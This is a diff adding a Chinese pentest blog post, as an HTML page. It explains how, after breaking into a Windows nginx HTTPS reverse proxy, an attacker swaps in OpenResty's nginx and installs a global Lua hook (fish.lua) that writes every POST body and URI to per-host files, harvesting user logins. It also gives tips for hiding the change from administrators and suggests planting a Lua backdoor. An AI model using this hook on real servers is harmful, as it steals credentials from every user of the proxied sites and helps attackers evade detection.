@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+        <meta charset="utf-8" />
+        <title>openresty与https</title>
+        <link rel="stylesheet" href="/theme/css/main.css" />
+</head>
+
+<body id="index" class="home">
+        <header id="banner" class="body">
+                <h1><a href="/">Follow Your Heart </a></h1>
+                <nav><ul>
+                    <li><a href="/category/pentest.html">Pentest</a></li>
+                    <li><a href="/category/learning.html">Learning</a></li>
+                    <li><a href="/category/python.html">Python</a></li>
+                    <li><a href="/pages/tips.html">Tips</a></li>
+                    <li><a href="/pages/bash.html">Bash</a></li>
+                    <li><a href="/pages/question.html">Question</a></li>
+                    <li><a href="/pages/reverse-shell.html">各种姿势的反弹shell</a></li>
+                </ul></nav>
+        </header><!-- /#banner -->
+<section id="content" class="body">
+  <article>
+    <header>
+      <h1 class="entry-title">
+        <a href="/openresty-https.html" rel="bookmark"
+           title="Permalink to openresty与https">openresty与https</a></h1>
+    </header>
+<footer class="post-info">
+        <span class="published" title="2018-03-02T00:00:00+01:00">
+                <a href='#'>03/02/2018 </a>
+                <a href="/category/pentest.html">Pentest</a>
+        </span>
+
+
+
+</footer><!-- /.post-info -->
+    <div class="entry-content">
+      
+      <p>有一天小明日了一台windows版本nginx的https的反向的代理服务器（这语句不通顺）。。</p>
+<h4>问题来了:如果你日了一台https反向代理服务器怎么办？</h4>
+<h4>标准答案：凉拌啊，卧槽。</h4>
+<h4>P神的答案：<a href="http://wooyun.jozxing.cc/static/drops/tips-6403.html">http://wooyun.jozxing.cc/static/drops/tips-6403.html</a></h4>
+<h3>磨刀霍霍向猪羊</h3>
+<p>开日：</p>
+<p>Ok，windows版本的，你需要一个支持lua的nginx：</p>
+<ul>
+<li>选择1: 在windows下编译一个单版本nginx带lua模块（这听起来就不是人干的活）</li>
+<li>选择3: openresty（这个拼音好长）</li>
+</ul>
+<h3>翠花，上酸菜：</h3>
+<p>下载openresty和nginx的windows版本，先本地测试一下。</p>
+<p>如果直接复制openresty里面的nginx.exe到原汁原味nginx解压包里面，提示缺少dll，没毛病。</p>
+<h5>汤＋水复制过来：</h5>
+<p>把openresty里面的nginx.exe libgcc_s_dw2-1.dll lua51.dll，一起复制到纯天然版本nginx的文件夹里面，启动nginx.exe，perfect。</p>
+<p>然后。。。兄台你节操掉了：</p>
+<p>把本地环境搬到目标服务器测试下，没毛病，目标网站的反代正常工作，唯一不正常的就是http的response的header变成了openresty。（这里需要假设目标网管是个二货）</p>
+<p>你以为到这一步完了么？呵呵，我读书少你不要骗我</p>
+<h3>step2： 使用Lua截取目标反代的post数据包</h3>
+<p>根据P神的文章里面:</p>
+<p><code>access_by_lua_file /usr/local/openresty/luasrc/fish.lua;</code></p>
+<p>这个配置是http请求之前执行的，所以修改下这个lua文件：</p>
+<div class="highlight"><pre><span></span><span class="nv">local</span> <span class="nv">method</span><span class="o">=</span><span class="nv">ngx</span>.<span class="nv">req</span>.<span class="nv">get_method</span><span class="ss">()</span>
+<span class="nv">local</span> <span class="nv">fd</span> <span class="o">=</span> <span class="nv">io</span>.<span class="nv">open</span><span class="ss">(</span><span class="s2">&quot;</span><span class="s">C:</span><span class="se">\\</span><span class="s">windows</span><span class="se">\\</span><span class="s">temp</span><span class="se">\\</span><span class="s2">&quot;</span>..<span class="nv">ngx</span>.<span class="nv">var</span>.<span class="nv">host</span>..<span class="s2">&quot;</span><span class="s">.txt</span><span class="s2">&quot;</span>,<span class="s2">&quot;</span><span class="s">ab</span><span class="s2">&quot;</span><span class="ss">)</span>
+<span class="nv">ngx</span>.<span class="nv">req</span>.<span class="nv">read_body</span><span class="ss">()</span>
+<span class="nv">local</span> <span class="nv">data</span><span class="o">=</span><span class="nv">ngx</span>.<span class="nv">req</span>.<span class="nv">get_body_data</span><span class="ss">()</span>
+<span class="nv">local</span> <span class="nv">uri</span> <span class="o">=</span> <span class="nv">ngx</span>.<span class="nv">var</span>.<span class="nv">request_uri</span>
+<span class="k">if</span> <span class="nv">fd</span> <span class="o">==</span> <span class="nv">nil</span> <span class="k">then</span> <span class="k">return</span> <span class="k">end</span>
+<span class="k">if</span> <span class="nv">method</span> <span class="o">==</span> <span class="s2">&quot;</span><span class="s">POST</span><span class="s2">&quot;</span> <span class="k">then</span>
+    <span class="k">if</span> <span class="nv">data</span> <span class="o">==</span> <span class="nv">nil</span> <span class="k">then</span> <span class="k">return</span> <span class="k">end</span>
+    <span class="nv">fd</span>:<span class="nv">write</span><span class="ss">(</span><span class="nv">uri</span>..<span class="s2">&quot;</span><span class="s">[*]</span><span class="s2">&quot;</span>..<span class="nv">data</span>..<span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="ss">)</span>
+    <span class="nv">fd</span>:<span class="nv">close</span><span class="ss">()</span>
+<span class="k">end</span>
+</pre></div>
+
+
+<p>把这一坨翔保存为fish.lua，然后放到nginx里面conf目录下，修改nginx.conf：</p>
+<p><code>access_by_lua_file conf/fish.lua;</code></p>
+<p>把上面这一行放到nginx配置的server模块外面那一层，相当于全局过滤，因为目标服务器反向代理了n个站。</p>
+<p>参考链接：</p>
+<ul>
+<li><a href="https://moonbingbing.gitbooks.io/openresty-best-practices/openresty/get_req_body.html">https://moonbingbing.gitbooks.io/openresty-best-practices/openresty/get_req_body.html</a></li>
+<li><a href="http://wooyun.jozxing.cc/static/drops/tips-6403.html">http://wooyun.jozxing.cc/static/drops/tips-6403.html</a></li>
+</ul>
+<p>坑点：</p>
+<ul>
+<li>
+<p>由于是直接在目标服务器操作的，中间把站点给down了n+n次，修改lua文件n次，主要依靠error.log来修改fish.lua，中间要判断data不为nil，参考上面文章。</p>
+</li>
+<li>
+<p>openresty启动指定配置文件要绝对路径。</p>
+</li>
+<li>
+<p>如果lua在执行过程中出错（比如我碰到的data数据为空，虽然反代正常工作，但是用户登录就出错），服务器会报500，所以<strong>绝对</strong>保证lua文件不能出错。</p>
+</li>
+</ul>
+<p>最后达到什么效果： 截取所有的post数据和uri，根据域名放到不通的txt文件里面。 </p>
+<p>没图说个蛋蛋：</p>
+<p><img alt="" src="https://i.loli.net/2017/07/25/5977478193da9.png"></p>
+<p><img alt="" src="https://i.loli.net/2017/07/25/597748509b5b3.png"></p>
+<p>课后思考：</p>
+<ul>
+<li>在尽可能隐藏行迹的情况下，最好是编译一个支持lua的nginx单版本</li>
+<li>openresty里面的nginx和官网纯nginx是有区别的： 纯的nginx是绿色G图标，openresty就木有，还是上面那条：编译一个可实际目标一样的nginx。openresty和nginx的response头是不一样的。</li>
+</ul>
+<p>最后一个：如果某天撸了openresty的服务器，肿么感觉可以在配置里面留下一个lua的后门哩？</p>
+    </div><!-- /.entry-content -->
+
+  </article>
+</section>
+        <section id="extras" class="body">
+        </section><!-- /#extras -->
+
+
+</body>
+</html>
